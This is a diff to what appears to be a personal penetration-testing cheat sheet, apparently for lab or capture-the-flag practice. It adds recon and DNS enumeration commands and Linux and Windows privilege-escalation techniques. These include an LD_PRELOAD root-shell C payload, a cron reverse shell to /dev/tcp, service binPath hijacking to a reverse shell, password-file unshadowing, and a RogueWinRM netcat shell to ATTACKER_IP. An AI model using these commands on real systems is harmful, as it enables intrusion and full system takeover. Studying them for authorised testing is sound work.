@@ -75,6 +75,8 @@ https://github.com/danielmiessler/SecLists
 
 [OWASP favicon Database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
 
+[Shodan](https://www.shodan.io/)
+
 ### Tools:
 
 Content Discovery:
@@ -108,7 +110,30 @@ DNS Bruteforce:
 ```
 dnsrecon   
 ```
+Domain Enumeration:
+
+`whois <domain_name>`
+
+```
+nslookup <domain_name> <dns_server(local/public)(optional)>
+    -type 
+        A       IPv4 Addresses
+        AAAA    IPv6 Addresses
+        CNAME   Canonical Name
+        MX      Mail Servers
+        SOA     Start of Authority
+        TXT     TXT Records
+```
+```
+dig @<server> <domain_name> <type>
+    server -> optional
+    type -> see nslookup
+```
+
+
 Subdomain Enumeration:
+
+[DNSdumpster](https://dnsdumpster.com/)
 
 [Sublist3r](https://github.com/aboul3la/Sublist3r)
 ```
@@ -369,13 +394,17 @@ need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/
 
 ## 6. Linux Privilege Escalation:
 
+### useful links:
+
+[HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+
 ### Tools:
 
 [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 [LinEnum](https://github.com/rebootuser/LinEnum)
 
-[LES (Linux Exploti Suggester)](https://github.com/mzet-/linux-exploit-suggester)
+[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
 
 [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 
@@ -383,60 +412,110 @@ need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/
 
 ### manual Enumeration:
 
-`hostname`
+`hostname`  
 
-`uname -a`
+`uname -a` (additional info about the kerne)
 
 `cat /etc/os-release`
 
 `cat /etc/issue`
 
-`id`
+`id` (can also be used to check id for other users)
 
 `whoami`
 ```
-    ps          
-        -A      view all running processes
-        aux     a = show processes for all users
-                u = show who launched process
-                x = show processes not attached to terminal
-        axjf    view process tree
+ps          
+    -A      view all running processes
+    aux     a = show processes for all users
+            u = show who launched process
+            x = show processes not attached to terminal
+    axjf    view process tree
 ```
 `env`
 
-`sudo -l`
+`ifconfig`
 
 `cat /etc/passwd`
 
-`cat /etc/passwd | cut -d ":" -f 1`
+`cat /etc/passwd | cut -d ":" -f 1` (convert PW file into brute-forcable list)
 
 `cat history`
 
 ```
-    netstat
-        -a      show all listening ports
-        -at     show tcp ports
-        -au     show udp ports
-        -l      list ports in listening mode (can be used with -t option)
-        -s      show network usage statisticsby protocol (can be used with -t/-u option)
-        -tp     show conncetions with service name and PID (can be used with -l option)
-        -i      show interfaces
-        -ano
-            -a  display all sockets
-            -n  do not resolve names
-            -o  display timers
+netstat
+    -a      show all listening ports
+    -at     show tcp ports
+    -au     show udp ports
+    -l      list ports in listening mode (can be used with -t option)
+    -s      show network usage statisticsby protocol (can be used with -t/-u option)
+    -tp     show conncetions with service name and PID (can be used with -l option)
+    -i      show interfaces
+    -ano
+        -a  display all sockets
+        -n  do not resolve names
+        -o  display timers
+```
+
+```
+find / -type d -name config             find the directory named config under “/”
+find / -type f -perm 0777               find files with the 777 permissions
+find / -perm a=x                        find executable files
+find /home -user frank                  find all files for user “frank” under “/home”
+find / -mtime 10                        find files that were modified in the last 10 days
+find / -atime 10                        find files that were accessed in the last 10 day
+find / -cmin -60                        find files changed within the last hour (60 minutes)
+find / -amin -60                        find files accesses within the last hour (60 minutes)
+find / -size 50M                        find files with a 50 MB size
+
+find / -writable -type d 2>/dev/null    Find world-writeable folders
+find / -perm -222 -type d 2>/dev/null   Find world-writeable folders
+find / -perm -o w -type d 2>/dev/null   Find world-writeable folders
+
+find / -perm -o x -type d 2>/dev/null   Find world-executable folders
+
+find / -name perl*                      Find development tools and supported languages
+find / -name python*                    Find development tools and supported languages
+find / -name gcc*                       Find development tools and supported languages
 ```
 `unshadow passwd.txt shadow.txt > passwords.txt`
+#### Sudo:
+`sudo -l` and check [GTFOBins](https://gtfobins.github.io/)
+
+Leverage LD_Preload (if env_keep+=LD_PRELOAD is set):
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
 
 #### Suid:
 
 `find / -type f -perm -04000 -ls 2>/dev/null`
+
+`find / -perm -u=s -type f 2>/dev/null`
 
 #### Capabilities:
 `getcap -r / 2>/dev/null`
 
 #### Cron Jobs:
 `cat /etc/crontab`
+
+example script:
+```
+#! /bin/bash
+
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
 
 #### PATH:
 `echo $PATH`
@@ -452,10 +531,16 @@ add /tmp folder to path: `export PATH=/tmp:$PATH`
 run path: `./path`
 
 #### NFS:
+```
+showmount -e <ip
 
-`showmount -e <ip>`
-
-
+A:  mkdir /tmp/<directory>
+    mount -o rw <ip>:<mount_option_from list> /tmp<created_directory>
+    cd into directory
+    create executable and compile it with gcc <name>.c -o <name> -w
+    add Suid bit chmod +s <name>
+T:  execute
+```
 
 ## 7. Windows Privilege Escalation:
 
@@ -463,6 +548,15 @@ run path: `./path`
 
 [PayloadAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
+[HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+
+[Priv2 Admin (Overview Windows Privileges)](https://github.com/gtworek/Priv2Admin)
+
+[Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)
+
+[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)
+
+[Decoder Blog (further education)](https://decoder.cloud/)
 ### Tools:
 
 1. [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
@@ -533,14 +627,19 @@ run path: `./path`
     Check permissions: icals <executable_path>
     Start/Stop Service: sc start/stop <service>
 
-    in Powershell replace sc with sc.exe
+    insecure service permissions:
+        icacls <executable path(rev-shell)> /grant Everyone:F
+        sc config <service> binPath= "<executable path(rev-shell)>" obj= LocalSystem
 
+    in Powershell replace sc with sc.exe
 
 #### Windows Privileges:
 
 `whoami /priv`
 
-TO-DO
+After fake RogueWinRM service is running:
+
+`c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
 
 #### unpatched Software:
 
